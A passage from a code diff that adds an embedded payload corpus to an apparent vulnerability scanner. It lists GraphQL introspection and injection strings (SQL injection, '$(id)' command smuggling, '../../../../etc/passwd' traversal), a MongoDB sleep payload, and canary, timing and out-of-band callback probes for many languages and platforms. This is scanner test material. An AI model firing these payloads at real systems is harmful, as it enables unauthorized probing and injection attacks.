+                    "{\"$accumulator\": {\"init\": \"function(){return sleep(5000)}\", \"accumulate\": \"function(){}\", \"accumulateArgs\": [], \"merge\": \"function(){}\", \"lang\": \"js\"}}"
+                ]
+            }
+        },
+        "graphql_injection": {
+            "graphql": {
+                "introspection": [
+                    "{__schema{types{name}}}",
+                    "{__schema{queryType{name} mutationType{name} types{name fields{name}}}}",
+                    "{__type(name:\"User\"){name fields{name type{name kind}}}}",
+                    "query{__typename}"
+                ],
+                "injection": [
+                    "{ user(id: \"1; id\") { name } }",
+                    "{ user(id: \"1' OR '1'='1-- \") { name } }",
+                    "{ search(q: \"$(id)\") { id } }",
+                    "{ file(path: \"../../../../etc/passwd\") { content } }",
+                    "{ user(id: \"1${IFS}||${IFS}id\") { name } }"
+                ],
+                "batching": [
+                    "{ a: user(id:\"1\"){name} b: user(id:\"2\"){name} c: user(id:\"3\"){name} }",
+                    "query { a { b { c { d { e } } } } }"
+                ]
+            }
+        }
+    },
+    "detection_payloads": {
+        "unix": [
+            "echo DETECTION_{canary}",
+            "sleep 5",
+            "printf 'canary:%s' $(hostname)",
+            "command -v whoami && echo HEALTH_{canary}",
+            "printf 'det:%s' $(id -u)",
+            "curl http://{oob}/",
+            "nslookup {oob}"
+        ],
+        "windows": [
+            "echo DETECTION_{canary}",
+            "timeout /T 5",
+            "powershell -Command \"Start-Sleep -Seconds 3; Write-Output 'DETECTION_{canary}'\"",
+            "for /f \"tokens=2 delims==\" %i in (\"%TIME%\") do @echo DETECTION_{canary}:%i",
+            "powershell -Command \"[Console]::WriteLine('det-{canary}')\"",
+            "nslookup {oob}"
+        ],
+        "php": [
+            "echo 'DETECTION_{canary}';",
+            "error_log('DETECTION_{canary}');",
+            "var_dump('DETECTION_{canary}');"
+        ],
+        "python": [
+            "print('DETECTION_{canary}')",
+            "import time; time.sleep(2)",
+            "import os; print(f'detect:{canary}:{os.getpid()}')",
+            "__import__('time').sleep(1)"
+        ],
+        "nodejs": [
+            "console.log('DETECTION_{canary}')",
+            "setTimeout(()=>console.log('timer {canary}'), 1000)",
+            "process.stdout.write('detect-{canary}')",
+            "setImmediate(()=>console.log('det:{canary}'))"
+        ],
+        "java": [
+            "System.out.println(\"DETECTION_{canary}\");",
+            "Thread.sleep(2000);",
+            "System.err.println(\"DETECTION_{canary}\");",
+            "System.out.printf(\"det:%s\\n\", \"{canary}\");"
+        ],
+        "dotnet": [
+            "Console.WriteLine(\"DETECTION_{canary}\");",
+            "System.Threading.Thread.Sleep(2000);",
+            "Console.Error.WriteLine(\"det-{canary}\");"
+        ],
+        "docker": [
+            "echo 'detector:{canary}'",
+            "sleep 2",
+            "cat /proc/1/cgroup | head -n 5"
+        ],
+        "kubernetes": [
+            "kubectl get pods --namespace default",
+            "echo 'kube-detect-{canary}'",
+            "kubectl cluster-info"
+        ],
+        "ruby": [
+            "puts 'DETECTION_{canary}'",
+            "sleep 1"
+        ],
+        "perl": [
+            "print \"DETECTION_{canary}\\n\";",
+            "select(undef, undef, undef, 1);"
+        ],
+        "go": [
+            "fmt.Println(\"DETECTION_{canary}\")",
+            "time.Sleep(1 * time.Second)"
+        ],
+        "sql": [
+            "SELECT 'DETECTION_{canary}';",
+            "SELECT pg_sleep(1);"
+        ],
+        "powershell": [
+            "Write-Output \"DETECTION_{canary}\"",
+            "Start-Sleep -Milliseconds 500"
+        ]
+    }
+}
+"""
+# --- END EMBEDDED PAYLOAD CORPUS ---
 
 if __name__ == "__main__":
     sys.exit(main())
